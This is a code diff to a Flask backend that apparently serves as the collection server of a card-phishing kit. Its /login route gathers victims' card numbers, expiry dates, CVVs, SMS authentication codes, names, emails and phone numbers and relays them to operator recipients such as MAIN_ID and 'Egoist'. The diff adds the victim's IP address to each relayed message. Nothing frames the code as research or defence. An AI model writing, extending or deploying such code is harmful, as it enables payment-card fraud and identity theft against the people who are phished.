@@ -21,7 +21,6 @@ def chel():
     ip_address = request.args.get('ip')
     
     if ip_address:
-        # Передача IP-адреса в функцию cheltut
         cheltut(ip_address)
         return jsonify({"message": "IP address received", "ip": ip_address})
     else:
@@ -45,6 +44,7 @@ def login():
         name = request.args.get('name')
         email = request.args.get('email')
         tel = request.args.get('tel')
+        ip_address = request.args.get('ip')
     elif request.method == 'POST':
         print("Received a POST request:")
         print(f"Full URL: {request.url}")
@@ -60,6 +60,7 @@ def login():
         name = data.get('name')
         tel = data.get('tel')
         email = data.get('email')
+        ip_address = data.get('ip')
     print(email, 495592185123908439878598547398345978435978)
     ID = f'{session}'
     # WE
@@ -67,7 +68,7 @@ def login():
         if authCode != None and authCode != 'None':
             send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
             return ''
-        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel)
+        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
         ne_pizdabol(card_number)
         return ''
 
@@ -77,7 +78,7 @@ def login():
             send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
             return ''
         ne_pizdabol(card_number)
-        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel)
+        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
         return ''
 
 
